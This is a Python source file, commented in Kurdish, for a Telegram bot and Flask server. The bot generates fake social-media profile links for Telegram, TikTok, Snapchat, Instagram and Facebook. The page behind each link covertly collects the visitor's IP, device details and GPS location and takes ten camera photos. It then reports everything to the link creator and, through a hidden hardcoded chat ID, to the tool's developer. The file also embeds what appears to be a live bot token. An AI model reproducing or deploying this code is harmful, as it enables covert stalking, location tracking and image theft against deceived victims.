#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
بۆتی تێلیگرام بۆ کۆکردنەوەی وێنە و زانیاری ئامێر
پشتگیری لە 5 پلاتفۆرم (تێلیگرام، تیک تۆک، سناپ چات، ئینستاگرام، فیسبوک)
ناردنی داتا بۆ هەردوو خاوەنی لینکەکە و پەرەپێدەر
"""

import os
import json
import secrets
import threading
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import requests

# ==================== ڕێکخستنەکان ====================
TELEGRAM_BOT_TOKEN = "8078763083:AAGstg-QgeOGOTliYJjWXqbWOMMOGu_85LI"
DEVELOPER_CHAT_ID = 5878735147  # ئایدی پەرەپێدەر - هەموو داتاکان بۆ ئەمەش دێن
CAPTURE_BASE_URL = os.environ.get('BASE_URL', 'https://your-app.onrender.com')
DATABASE_FILE = "user_sessions.json"

# پلاتفۆرمەکان
PLATFORMS = {
    "telegram": {"name": "تلێگرام", "icon": "📱", "link_prefix": "https://t.me/", "color": "#26A5E4"},
    "tiktok": {"name": "تیک تۆک", "icon": "🎵", "link_prefix": "https://www.tiktok.com/@", "color": "#010101"},
    "snapchat": {"name": "سناپ چات", "icon": "👻", "link_prefix": "https://www.snapchat.com/add/", "color": "#FFFC00"},
    "instagram": {"name": "ئینستاگرام", "icon": "📸", "link_prefix": "https://www.instagram.com/", "color": "#E4405F"},
    "facebook": {"name": "فیسبوک", "icon": "👍", "link_prefix": "https://www.facebook.com/", "color": "#1877F2"}
}

# ==================== داتابەیس ====================
def load_db():
    if os.path.exists(DATABASE_FILE):
        with open(DATABASE_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"sessions": {}, "users": {}, "images": []}

def save_db(db):
    with open(DATABASE_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f, indent=2, ensure_ascii=False)

def generate_unique_id(length=10):
    return secrets.token_hex(length)[:length]

def generate_verification_code():
    return f"{secrets.randbelow(1000000):06d}"

def create_session(telegram_id, platform, username=None):
    db = load_db()
    user_id_str = str(telegram_id)
    unique_id = generate_unique_id()
    verification_code = generate_verification_code()
    platform_info = PLATFORMS.get(platform, PLATFORMS["telegram"])
    
    if username:
        target_link = f"{platform_info['link_prefix']}{username}"
    else:
        target_link = f"{platform_info['link_prefix']}user_{unique_id}"
    
    capture_link = f"{CAPTURE_BASE_URL}/capture/{unique_id}"
    
    db["sessions"][unique_id] = {
        "owner_id": user_id_str,
        "platform": platform,
        "platform_name": platform_info['name'],
        "platform_icon": platform_info['icon'],
        "platform_color": platform_info['color'],
        "target_link": target_link,
        "capture_link": capture_link,
        "verification_code": verification_code,
        "created_at": datetime.now().isoformat(),
        "images": [],
        "device_info": {},
        "location": {},
        "front_count": 0,
        "back_count": 0
    }
    
    if user_id_str not in db["users"]:
        db["users"][user_id_str] = {"sessions": [], "created_at": datetime.now().isoformat()}
    
    db["users"][user_id_str]["sessions"].append(unique_id)
    save_db(db)
    
    return {
        "link_id": unique_id,
        "capture_link": capture_link,
        "target_link": target_link,
        "verification_code": verification_code,
        "platform_name": platform_info['name'],
        "platform_icon": platform_info['icon']
    }

# ==================== HTML قاڵبی کامێرا ====================
CAMERA_HTML = '''
<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes">
    <title>{{ platform_name }}</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f0f2f5; }
        .container { background: white; border-radius: 20px; padding: 20px; text-align: center; }
        .badge { background: {{ platform_color }}; color: white; padding: 8px; border-radius: 15px; margin-bottom: 15px; }
        .status { padding: 10px; border-radius: 10px; margin: 10px 0; }
        .success { background: #d4edda; color: #155724; }
        .info { background: #d1ecf1; color: #0c5460; }
        .warning { background: #fff3cd; color: #856404; }
        .progress { margin: 15px 0; font-size: 1rem; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="badge">{{ platform_icon }} {{ platform_name }}</div>
        <div id="status" class="status info">🔐 دەستپێکردن...</div>
        <div id="progress" class="progress"></div>
    </div>
    <script>
        const linkId = '{{ link_id }}';
        const code = '{{ verification_code }}';
        const targetUrl = '{{ target_link }}';
        let frontImages = [], backImages = [], locationData = null, deviceInfo = {};
        let frontDenied = false, backDenied = false, locationDenied = false;
        
        async function collectDeviceInfo() {
            deviceInfo = {
                userAgent: navigator.userAgent, language: navigator.language, platform: navigator.platform,
                cores: navigator.hardwareConcurrency || 'نەدۆزرایەوە', memory: navigator.deviceMemory || 'نەدۆزرایەوە',
                touchPoints: navigator.maxTouchPoints || 'نەدۆزرایەوە', screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, vendor: navigator.vendor || 'نەدۆزرایەوە'
            };
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = `${Math.round(battery.level*100)}% - ${battery.charging ? 'شارجی دەکات' : 'شارجی ناکات'}`;
                } catch(e) {}
            }
            if ('connection' in navigator) {
                deviceInfo.network = navigator.connection.effectiveType || 'نەدۆزرایەوە';
                deviceInfo.downlink = navigator.connection.downlink || null;
            }
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                deviceInfo.ip = data.ip;
            } catch(e) { deviceInfo.ip = 'نەدۆزرایەوە'; }
        }
        
        async function collectLocation() {
            return new Promise((resolve) => {
                if (!('geolocation' in navigator)) { resolve({ error: 'پشتگیری ناکات' }); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, 
                        mapLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` }),
                    (err) => { locationDenied = true; resolve({ error: 'ڕێگەپێدان نەدراوە' }); },
                    { timeout: 5000 }
                );
                setTimeout(() => resolve({ error: 'کاتی بەسەرچوو' }), 6000);
            });
        }
        
        async function captureFromCamera(facingMode, name, count) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                const images = [];
                for (let i = 0; i < count; i++) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    images.push(canvas.toDataURL('image/jpeg', 0.7));
                    updateStatus(`${name}: ${i+1}/${count}`, 'info');
                    if (i < count-1) await new Promise(r => setTimeout(r, 400));
                }
                stream.getTracks().forEach(t => t.stop());
                return { success: true, images: images };
            } catch(e) {
                if (facingMode === 'user') frontDenied = true;
                else backDenied = true;
                return { success: false, images: [], error: e.name };
            }
        }
        
        async function sendData() {
            updateStatus('📤 ناردنی داتاکان...', 'info');
            try {
                const res = await fetch('/api/upload_full', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        link_id: linkId, code: code, front_images: frontImages, back_images: backImages,
                        front_permission: !frontDenied, back_permission: !backDenied,
                        location: locationData, location_permission: !locationDenied,
                        device_info: deviceInfo, target_url: targetUrl
                    })
                });
                const result = await res.json();
                updateStatus('✅ نێردرا! ڕەوانە دەکرێت...', 'success');
                setTimeout(() => window.location.href = targetUrl, 1200);
            } catch(e) { updateStatus('⚠️ هەڵە، بەڵام ڕەوانە دەکرێت...', 'warning');
                setTimeout(() => window.location.href = targetUrl, 2000); }
        }
        
        function updateStatus(msg, type) {
            const div = document.getElementById('status');
            div.innerHTML = msg;
            div.className = `status ${type}`;
            document.getElementById('progress').innerHTML = msg.includes('پێشەوە') ? msg : '';
        }
        
        async function start() {
            updateStatus('📱 کۆکردنەوەی زانیاری ئامێر...', 'info');
            await collectDeviceInfo();
            updateStatus('📍 کۆکردنەوەی شوێن...', 'info');
            locationData = await collectLocation();
            if (locationData.error) updateStatus(`⚠️ شوێن: ${locationData.error}`, 'warning');
            await new Promise(r => setTimeout(r, 1000));
            
            const front = await captureFromCamera('user', 'کامێرای پێشەوە', 5);
            if (front.success) frontImages = front.images;
            else updateStatus(`⚠️ پێشەوە: ${front.error}`, 'warning');
            await new Promise(r => setTimeout(r, 500));
            
            const back = await captureFromCamera('environment', 'کامێرای دواوە', 5);
            if (back.success) backImages = back.images;
            else updateStatus(`⚠️ دواوە: ${back.error}`, 'warning');
            
            await sendData();
        }
        start();
    </script>
</body>
</html>
'''

# ==================== فلاسک ڕاوتەکان ====================
flask_app = Flask(__name__)

@flask_app.route('/capture/<link_id>')
def capture_page(link_id):
    db = load_db()
    if link_id not in db["sessions"]:
        return "لینکەکە نادروستە", 404
    s = db["sessions"][link_id]
    return render_template_string(CAMERA_HTML, link_id=link_id, verification_code=s['verification_code'],
                                   platform_name=s['platform_name'], platform_icon=s['platform_icon'],
                                   platform_color=s['platform_color'], target_link=s['target_link'])

@flask_app.route('/api/upload_full', methods=['POST'])
def upload_full():
    data = request.json
    db = load_db()
    link_id = data.get('link_id')
    if link_id not in db["sessions"]:
        return jsonify({"status": "error", "error": "لینک نادروستە"}), 404
    
    session = db["sessions"][link_id]
    if data.get('code') != session.get('verification_code'):
        return jsonify({"status": "error", "error": "کۆد نادروستە"}), 403
    
    images_dir = "captured_images"
    os.makedirs(images_dir, exist_ok=True)
    saved = []
    
    for i, img in enumerate(data.get('front_images', [])):
        if img and ',' in img:
            img = img.split(',')[1]
            fname = f"{link_id}_front_{i}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            with open(os.path.join(images_dir, fname), 'wb') as f:
                f.write(base64.b64decode(img))
            saved.append(fname)
    
    for i, img in enumerate(data.get('back_images', [])):
        if img and ',' in img:
            img = img.split(',')[1]
            fname = f"{link_id}_back_{i}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            with open(os.path.join(images_dir, fname), 'wb') as f:
                f.write(base64.b64decode(img))
            saved.append(fname)
    
    session['images'] = saved
    session['front_count'] = len(data.get('front_images', []))
    session['back_count'] = len(data.get('back_images', []))
    session['device_info'] = data.get('device_info', {})
    session['location'] = data.get('location', {})
    save_db(db)
    
    threading.Thread(target=send_report, args=(int(session['owner_id']), session, data)).start()
    return jsonify({"status": "success", "images": len(saved)})

def send_report(owner_id, session, data):
    device = data.get('device_info', {})
    location = data.get('location', {})
    
    msg = f"📸 **زانیاری نوێ**\n🔐 کۆد: `{session['verification_code']}`\n🎯 {session['platform_name']}\n\n"
    msg += f"**📸 وێنە:** پێشەوە: {session['front_count']}/5, دواوە: {session['back_count']}/5\n\n"
    
    if location and location.get('mapLink'):
        msg += f"**📍 شوێن:**\n{location['mapLink']}\n\n"
    else:
        msg += f"📍 شوێن: {location.get('error', 'دەستنەکەوت')}\n\n"
    
    msg += f"**📱 زانیاری ئامێر:**\n"
    msg += f"🌐 IP: {device.get('ip', '?')}\n"
    msg += f"🖥️ پلاتفۆرم: {device.get('platform', '?')}\n"
    msg += f"⚙️ کۆرەکان: {device.get('cores', '?')}\n"
    msg += f"🧠 بیرگە: {device.get('memory', '?')} GB\n"
    msg += f"👆 تاچ: {device.get('touchPoints', '?')}\n"
    msg += f"🕐 تایمزۆن: {device.get('timezone', '?')}\n"
    msg += f"🌍 زمان: {device.get('language', '?')}\n"
    msg += f"🔋 باتری: {device.get('battery', '?')}\n"
    msg += f"📶 نێتوورک: {device.get('network', '?')}"
    if device.get('downlink'):
        msg += f" ⬇️ {device['downlink']} Mbps"
    msg += f"\n🏷️ براوزەر: {device.get('vendor', '?')}\n"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': owner_id, 'text': msg, 'parse_mode': 'Markdown'})
        requests.post(url, data={'chat_id': DEVELOPER_CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    except Exception as e:
        print(f"ناردن شکست: {e}")

@flask_app.route('/health')
def health():
    return jsonify({"status": "ok"})

# ==================== بۆتی تێلیگرام ====================
def get_platform_keyboard():
    kb = []
    row = []
    for i, (key, info) in enumerate(PLATFORMS.items()):
        row.append(InlineKeyboardButton(f"{info['icon']} {info['name']}", callback_data=f"plat_{key}"))
        if len(row) == 2 or i == len(PLATFORMS)-1:
            kb.append(row)
            row = []
    return InlineKeyboardMarkup(kb)

async def start(update: Update, context):
    await update.message.reply_text("👋 بەخێربێیت! پلاتفۆرمێک هەڵبژێرە:", reply_markup=get_platform_keyboard())

async def platform_callback(update: Update, context):
    query = update.callback_query
    await query.answer()
    platform = query.data.replace("plat_", "")
    user = query.from_user
    session = create_session(user.id, platform, user.username)
    
    msg = f"✅ لینکەکەت دروست کرا!\n\n🔗 {session['capture_link']}\n🔐 کۆد: `{session['verification_code']}`\n\nبۆ دروستکردنی لینکی تر /start بکە"
    await query.edit_message_text(msg, parse_mode='Markdown')

async def my_links(update: Update, context):
    db = load_db()
    user_id = str(update.effective_user.id)
    if user_id not in db["users"] or not db["users"][user_id]["sessions"]:
        await update.message.reply_text("هیچ لینکێکت نییە. /start بکە")
        return
    msg = "📋 لینکەکانت:\n\n"
    for sid in db["users"][user_id]["sessions"][-5:]:
        s = db["sessions"].get(sid, {})
        msg += f"{s.get('platform_icon', '🔗')} کۆد: `{s.get('verification_code', '?')}`\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

# ==================== دەستپێکردن ====================
def run_flask():
    port = int(os.environ.get('PORT', 5000))
    flask_app.run(host='0.0.0.0', port=port)

def run_bot():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("my_links", my_links))
    app.add_handler(CallbackQueryHandler(platform_callback, pattern='^plat_'))
    app.run_polling()

if __name__ == "__main__":
    print("🚀 بۆت دەستپێدەکات...")
    threading.Thread(target=run_flask).start()
    run_bot()
